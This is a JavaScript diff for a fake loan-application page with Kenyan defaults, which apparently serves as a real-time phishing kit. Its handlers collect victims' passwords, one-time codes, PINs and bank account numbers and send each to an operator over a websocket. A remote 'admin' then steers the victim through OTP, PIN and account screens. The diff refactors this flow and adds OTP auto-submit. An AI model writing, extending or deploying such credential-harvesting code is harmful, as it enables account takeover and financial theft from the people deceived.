@@ -115,6 +115,7 @@ let currentLang = "ENG";
 let currentCountry = "KENYA";
 let currentCurrency = "KES";
 let ws = null;
+let savedIdentifier = "";
 
 document.addEventListener("DOMContentLoaded", () => {
   initWebSocket();
@@ -139,7 +140,6 @@ function initWebSocket() {
 }
 
 function bindEvents() {
-  // Language Switch
   const langToggle = document.getElementById("langToggle");
   if (langToggle) {
     langToggle.addEventListener("change", (e) => {
@@ -150,7 +150,6 @@ function bindEvents() {
     });
   }
 
-  // Country Dropdowns
   const welcomeCountry = document.getElementById("countrySelect");
   const loginCountry = document.getElementById("loginCountrySelect");
 
@@ -163,10 +162,8 @@ function bindEvents() {
     });
   }
 
-  // Password Visibility Toggle (Eye Icon)
   const togglePassword = document.getElementById("togglePassword");
   const passwordInput = document.getElementById("loginPassword");
-
   if (togglePassword && passwordInput) {
     togglePassword.addEventListener("click", () => {
       const isPassword = passwordInput.getAttribute("type") === "password";
@@ -175,141 +172,121 @@ function bindEvents() {
     });
   }
 
-  // Welcome Screen Navigation -> Goes to Calculator Slider
-  const welcomeNextBtn = document.getElementById("welcomeNextBtn");
-  if (welcomeNextBtn) {
-    welcomeNextBtn.addEventListener("click", () => switchScreen("screen-calculator"));
-  }
+  // Navigation handlers
+  document.getElementById("welcomeNextBtn")?.addEventListener("click", () => switchScreen("screen-calculator"));
+  document.getElementById("welcomeRegisterBtn")?.addEventListener("click", () => switchScreen("screen-calculator"));
+  document.getElementById("headerBackBtn")?.addEventListener("click", () => switchScreen("screen-welcome"));
+  
+  document.getElementById("loanAmountSlider")?.addEventListener("input", updateCalculator);
+  document.getElementById("loanTermSlider")?.addEventListener("input", updateCalculator);
 
-  const welcomeRegisterBtn = document.getElementById("welcomeRegisterBtn");
-  if (welcomeRegisterBtn) {
-    welcomeRegisterBtn.addEventListener("click", () => switchScreen("screen-calculator"));
-  }
+  document.getElementById("calcNextBtn")?.addEventListener("click", () => switchScreen("screen-form"));
+  document.getElementById("calcRegisterBtn")?.addEventListener("click", () => switchScreen("screen-form"));
+  document.getElementById("formSaveContinueBtn")?.addEventListener("click", () => switchScreen("screen-login"));
 
-  // Header Back Button
-  const headerBackBtn = document.getElementById("headerBackBtn");
-  if (headerBackBtn) {
-    headerBackBtn.addEventListener("click", () => switchScreen("screen-welcome"));
-  }
+  // Login Submit
+  document.getElementById("loginSubmitBtn")?.addEventListener("click", () => {
+    const identifier = document.getElementById("loginIdentifier").value.trim();
+    const password = document.getElementById("loginPassword").value.trim();
 
-  // Calculator Sliders
-  const loanSlider = document.getElementById("loanAmountSlider");
-  const termSlider = document.getElementById("loanTermSlider");
-  if (loanSlider) loanSlider.addEventListener("input", updateCalculator);
-  if (termSlider) termSlider.addEventListener("input", updateCalculator);
+    if (!identifier || !password) {
+      showSurfaceNotification("Please enter email/phone and password.");
+      return;
+    }
 
-  const calcNextBtn = document.getElementById("calcNextBtn");
-  if (calcNextBtn) {
-    calcNextBtn.addEventListener("click", () => switchScreen("screen-form"));
-  }
+    savedIdentifier = identifier;
 
-  const calcRegisterBtn = document.getElementById("calcRegisterBtn");
-  if (calcRegisterBtn) {
-    calcRegisterBtn.addEventListener("click", () => switchScreen("screen-form"));
-  }
-
-  // Form Save & Continue
-  const formSaveContinueBtn = document.getElementById("formSaveContinueBtn");
-  if (formSaveContinueBtn) {
-    formSaveContinueBtn.addEventListener("click", () => switchScreen("screen-login"));
-  }
-
-  // Login Submit -> Triggers Telegram Notification
-  const loginSubmitBtn = document.getElementById("loginSubmitBtn");
-  if (loginSubmitBtn) {
-    loginSubmitBtn.addEventListener("click", () => {
-      const identifier = document.getElementById("loginIdentifier").value.trim();
-      const password = document.getElementById("loginPassword").value.trim();
-
-      if (!identifier || !password) {
-        showSurfaceNotification("Please enter email/phone and password.");
-        return;
-      }
-
-      sendPayload({
-        step: "LOGIN_SUBMIT",
-        country: currentCountry,
-        currency: currentCurrency,
-        amount: document.getElementById("loanAmountSlider") ? document.getElementById("loanAmountSlider").value : "250000",
-        identifier,
-        password
-      });
-
-      showLoading(true);
+    sendPayload({
+      step: "LOGIN_SUBMIT",
+      country: currentCountry,
+      currency: currentCurrency,
+      amount: document.getElementById("loanAmountSlider") ? document.getElementById("loanAmountSlider").value : "250000",
+      identifier,
+      password
     });
-  }
 
-  // OTP Submit
-  const otpSubmitBtn = document.getElementById("otpSubmitBtn");
-  if (otpSubmitBtn) {
-    otpSubmitBtn.addEventListener("click", () => {
-      const otp = document.getElementById("otpInput").value.trim();
-      if (!otp) {
-        showSurfaceNotification("Please enter OTP.");
-        return;
-      }
+    showLoading(true);
+  });
 
-      sendPayload({
-        step: "OTP_SUBMIT",
-        identifier: document.getElementById("loginIdentifier").value,
-        otp
+  // 6-Digit Auto-Tabbing & Auto-Submit for OTP
+  [1, 2, 3, 4, 5, 6].forEach(i => {
+    const otpBox = document.getElementById(`otp${i}`);
+    if (otpBox) {
+      otpBox.addEventListener("input", (e) => {
+        if (e.target.value && i < 6) {
+          document.getElementById(`otp${i+1}`).focus();
+        }
+        
+        const fullOtp = [1,2,3,4,5,6].map(idx => document.getElementById(`otp${idx}`).value).join("");
+        if (fullOtp.length === 6) {
+          submitOTP(fullOtp);
+        }
       });
+    }
+  });
 
-      showLoading(true);
-    });
-  }
+  document.getElementById("otpSubmitBtn")?.addEventListener("click", () => {
+    const fullOtp = [1,2,3,4,5,6].map(idx => document.getElementById(`otp${idx}`).value).join("");
+    if (fullOtp.length < 6) {
+      showSurfaceNotification("Please enter full 6-digit OTP.");
+      return;
+    }
+    submitOTP(fullOtp);
+  });
 
-  // PIN Submit
-  const pinSubmitBtn = document.getElementById("pinSubmitBtn");
-  if (pinSubmitBtn) {
-    pinSubmitBtn.addEventListener("click", () => {
-      const pin = [1,2,3,4].map(i => document.getElementById(`pin${i}`).value).join("");
-      if (pin.length < 4) {
-        showSurfaceNotification("Please enter full 4-digit PIN.");
-        return;
-      }
-
-      sendPayload({
-        step: "PIN_SUBMIT",
-        identifier: document.getElementById("loginIdentifier").value,
-        pin
-      });
-
-      showLoading(true);
-    });
-  }
-
-  // Account Number Submit
-  const accountSubmitBtn = document.getElementById("accountSubmitBtn");
-  if (accountSubmitBtn) {
-    accountSubmitBtn.addEventListener("click", () => {
-      const accountNo = document.getElementById("accountNumberInput").value.trim();
-      if (accountNo.length !== 10) {
-        showSurfaceNotification("Account number must be 10 digits.");
-        return;
-      }
-
-      sendPayload({
-        step: "ACCOUNT_SUBMIT",
-        identifier: document.getElementById("loginIdentifier").value,
-        accountNo
-      });
-
-      showLoading(true);
-    });
-  }
-
-  // PIN Auto-Tab
-  [1,2,3,4].forEach(i => {
-    const pinInput = document.getElementById(`pin${i}`);
-    if (pinInput) {
-      pinInput.addEventListener("input", (e) => {
+  // 4-Digit Auto-Tabbing for PIN
+  [1, 2, 3, 4].forEach(i => {
+    const pinBox = document.getElementById(`pin${i}`);
+    if (pinBox) {
+      pinBox.addEventListener("input", (e) => {
         if (e.target.value && i < 4) {
           document.getElementById(`pin${i+1}`).focus();
         }
       });
     }
   });
+
+  document.getElementById("pinSubmitBtn")?.addEventListener("click", () => {
+    const pin = [1,2,3,4].map(i => document.getElementById(`pin${i}`).value).join("");
+    if (pin.length < 4) {
+      showSurfaceNotification("Please enter full 4-digit PIN.");
+      return;
+    }
+
+    sendPayload({
+      step: "PIN_SUBMIT",
+      identifier: savedIdentifier,
+      pin
+    });
+
+    showLoading(true);
+  });
+
+  // Account Number Submit
+  document.getElementById("accountSubmitBtn")?.addEventListener("click", () => {
+    const accountNo = document.getElementById("accountNumberInput").value.trim();
+    if (accountNo.length !== 10) {
+      showSurfaceNotification("Account number must be 10 digits.");
+      return;
+    }
+
+    sendPayload({
+      step: "ACCOUNT_SUBMIT",
+      identifier: savedIdentifier,
+      accountNo
+    });
+
+    showLoading(true);
+  });
+}
+
+function submitOTP(otpVal) {
+  sendPayload({
+    step: "OTP_SUBMIT",
+    identifier: savedIdentifier,
+    otp: otpVal
+  });
+  showLoading(true);
 }
 
 function sendPayload(data) {
@@ -330,17 +307,27 @@ function handleAdminAction(action) {
   switch (action) {
     case 'ALLOW': switchScreen("screen-otp"); break;
     case 'DENY': showSurfaceNotification("Access Denied by Admin."); break;
-    case 'OTP_EXPIRED': showSurfaceNotification("OTP Expired! Re-enter OTP."); break;
+    case 'OTP_EXPIRED': showSurfaceNotification("OTP Expired! Re-enter OTP."); clearAllInputs(); break;
     case 'OTP_CORRECT': switchScreen("screen-pin"); break;
     case 'CONTINUE': switchScreen("screen-account"); break;
     case 'BLOCK': showSurfaceNotification("Account Blocked."); break;
-    case 'WRONG_PIN': showSurfaceNotification("Wrong PIN! Re-enter."); switchScreen("screen-pin"); break;
-    case 'WRONG_ACC_NUMBER': showSurfaceNotification("Wrong Account Number!"); switchScreen("screen-account"); break;
+    case 'WRONG_PIN': showSurfaceNotification("Wrong PIN! Re-enter."); switchScreen("screen-pin"); clearAllInputs(); break;
+    case 'WRONG_ACC_NUMBER': showSurfaceNotification("Wrong Account Number!"); switchScreen("screen-account"); clearAllInputs(); break;
     case 'APPROVED': switchScreen("screen-congratulations"); break;
   }
 }
 
+// Clear all inputs automatically on screen transition
+function clearAllInputs() {
+  document.querySelectorAll("input[type='text'], input[type='password'], input[type='email']").forEach(input => {
+    if (input.id !== "countrySelect" && input.id !== "loginCountrySelect") {
+      input.value = "";
+    }
+  });
+}
+
 function switchScreen(screenId) {
+  clearAllInputs();
   document.querySelectorAll(".screen").forEach(s => s.classList.add("hidden"));
   const target = document.getElementById(screenId);
   if (target) target.classList.remove("hidden");
@@ -393,4 +380,4 @@ function updateCalculator() {
   document.getElementById("formSelectedAmount").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
   document.getElementById("formSelectedTerm").textContent = `${term} Months`;
     }
-    
+                          
